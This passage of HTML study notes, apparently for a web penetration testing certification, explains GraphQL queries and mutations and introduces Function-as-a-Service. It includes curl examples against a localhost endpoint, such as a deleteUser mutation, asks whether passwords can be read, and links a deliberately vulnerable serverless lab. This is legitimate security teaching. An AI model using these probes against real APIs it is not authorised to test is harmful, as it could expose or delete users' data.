APIs</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#graphql-apis"></a></strong></h3><p id="c4ed3c07-4285-4d6a-9ead-7eb2c62fe209" class="">GraphQL is a different type of API interface where there is one endpoint to an API (instead of many endpoints in REST), and two types of operations (Query and Mutate) instead of 5 or so in REST (GET, PUT, POST, PATCH, DELETE)</p><ul id="ea812b49-3391-42ea-b102-b3b4a854d044" class="bulleted-list"><li style="list-style-type:disc">Usually example.com/graphql or something similar (Nice idea of Google dorks)</li></ul><ul id="2b5cbaa2-c18d-4d20-a97a-ff8c3135162b" class="bulleted-list"><li style="list-style-type:disc">REST usually has one endpoint For each type of object (users, groups, items, books, orders, shipments…etc) with 3 or more operations on each endpoint</li></ul><ul id="b44860c5-9c0c-490e-b556-b3a6ea144f78" class="bulleted-list"><li style="list-style-type:disc">In GraphQL, the same endpoint serves all predefined objects under both Query and Mutation methods</li></ul><h3 id="daa3fd35-58c3-4182-b6c1-0f3e1d794da0" class=""><strong>GraphQL Terms</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#graphql-terms"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e3c05daa-01d3-4485-84a5-4d6f1fca9b45" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Query: A query operation on an object or type
+- Mutate: an update operation on an object, like creating a new one, updating it fully, updating it partially, or deleting it
+- Type (objecttype): A type of object, like a class or table, e.g. Users, Orders, books
+- Schema: Describes the types, fields and actions available
+- Introspection: A method to learn more about the schema details like types and fields
+- Resolver: A function that connects schema definitions to actual backend data sources like SQL tables
+- Scalar Type: Type of data For a field, like string, int or custom types.
+</code></pre><figure id="7163f1b0-26fd-4b8f-923a-b2a66fe4fc60" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/114.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/114.png"/></a></figure><p id="39fd841d-42d2-4de2-bb17-44f527a6cb6f" class="">GraphQL can also be called from the command line using curl:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf8194bd-a35c-440c-8c38-cb79ff2914b7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Using POST
+- Content-type is JSON
+- Output is sent to jq For pretty JSON
+</code></pre><p id="0748cced-6a82-4ac0-852e-5877d8e181db" class="">Calling a particular object in GraphQL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce337cf3-651b-4990-a089-bb1b5353ffe4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -X POST -H &quot;Content-Type: application/json&quot; --data &#x27;{&quot;query&quot;:&quot;{user(id:\&quot;2\&quot;) {id username} }&quot;}&#x27; http://localhost/graphql | jq
+</code></pre><h3 id="26344500-3c0f-4d69-8a6f-08ed6e598610" class=""><strong>GraphQL nesting queries</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#graphql-nesting-queries"></a></strong></h3><p id="8fd16369-5261-4d6f-82cd-01e59df77d09" class="">Display each user with his group subscriptions using GraphQL, showing the id and name of the group</p><blockquote id="6563b208-6b7d-40ab-b3a2-e34c719156e2" class="">Hint: groups {id name} Try both the GraphQL and Curl</blockquote><h3 id="51240d39-d7d8-42db-b449-317f3298d965" class=""><strong>Security in GraphQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#security-in-graphql"></a></strong></h3><p id="0b0b85d5-965e-4b41-854b-542a65a1b3ad" class="">GraphQl has no built-in understanding of security. It will return the object as it was requested</p><ul id="ef824c5a-1449-414d-a99c-263a5083b454" class="bulleted-list"><li style="list-style-type:disc">Without explicit filtering, sensitive data could be exposed and extracted</li></ul><ul id="73b28499-35b3-49f1-a70b-4bc2b8d4ee8c" class="bulleted-list"><li style="list-style-type:disc">Can we read user sensitive info such as passwords?</li></ul><h3 id="a55cea25-d6fb-49f4-adc3-b87050023492" class=""><strong>Making Updates in GraphQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#making-updates-in-graphql"></a></strong></h3><p id="4c794c72-4faa-4ded-8765-38a113648d28" class="">In graphql, updates (addition, creation, deletion) are called mutations</p><p id="6e514864-26b2-420b-a936-bdf51e402a92" class="">Example with 3 mudations:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52d079ec-d215-4ac5-ba83-d9f919791a77" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">class Mutation(graphene.ObjectType):
+  create_user = CreateUser.Field()
+  update_user = UpdateUser.Field()
+  delete_user = DeleteUser.Field()
+</code></pre><h3 id="5ac1175e-1e62-426e-b8e6-51c303985cfa" class=""><strong>Deleteuser Mutation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#deleteuser-mutation"></a></strong></h3><p id="409da824-a129-460b-b0f3-1e8b70d49653" class="">The deleteUser mutation can be called by:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3671661d-5e2d-4479-ad8f-4f82671d6f79" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Defining the query type to be mutation
+- Selecting the named deletUser mutation
+- Supplying the id to be deleted, and a sub selection For response (ok field here)
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0fe13f17-e044-41fd-8d59-ec6a9dac8c38" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">mutation deleUser
+{
+  deleteUser(id:24)
+  {
+    ok
+  }
+}
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e2b329e-3e7c-4916-971c-4774f8d12800" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -s -X POST -H &quot;Content-Type: application:json&quot; --data &#x27;{&quot;query&quot;:&quot;mutation {deleteUser(id:22){ok}}&quot;}&#x27; http://localhost/graphql | jq
+</code></pre><h3 id="854b4641-fcb6-41f7-82e1-6324b955f8cd" class=""><strong>Function as a Service</strong><strong><a href="https://johnermac.github.io/notes/ewptx/apiscloud/#function-as-a-service"></a></strong></h3><p id="3e86a15a-3ffc-4064-a4da-74cfa11f9f24" class="">Function as a Service (FaaS) is a modern (as of beginning of 2020) type of software architecture. Its implemented in most common cloud providers like AWS Lambda, Google Cloud Functions, IBM OpenWhisk or Microsoft Azure Functions</p><ul id="a4b04150-40a2-45a2-971d-2d0fca0afe3b" class="bulleted-list"><li style="list-style-type:disc">The FaaS model allows us to execute code in response to events without maintaning any infrastructure For it (apart from the cloud account). It allows the user to simply upload modular fragments of functionalities into the cloud in and they are executed independently</li></ul><p id="4ee313e4-c4cf-48f9-b69f-d302aaa4c1a4" class="">Such solution allows For better scalability, and is a next level of splitting a monolithic application into functional pieces</p><p id="396489a3-9212-4866-92df-c65cd7eb5624" class="">A sample <em>Hello World</em> in FaaS (written in Node.js)</p><figure id="d543cee8-2329-4bee-a31b-9f2e29535b49" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/115.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/115.png"/></a></figure><ul id="10b687d1-8baf-407d-8077-d5354785b38c" class="bulleted-list"><li style="list-style-type:disc">Despite being a function, keep in mind that any online service exchanges and processes data or does any sort of authentication. This is exactly the same subject to abuse as any other web or cloud application</li></ul><p id="9c9f5fb6-1edb-4ef0-bd3a-2d8c002ee5ae" class="">You can experiment more with Serverless software by downloading and playing with DVFaaS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b11aa20b-acc7-4cd5-8589-e8b721fe7212" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://github.com/we45/DVFaaS-Damn-Vulnerable-Functions-as-a-Service
+</code></pre><blockquote id="40b752b9-2302-4e58-bd03-a01370b33105" class="">Each subdirectory of the project contains detailed steps to follow in order deploy as well as exploit a vulnerable instance</blockquote></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
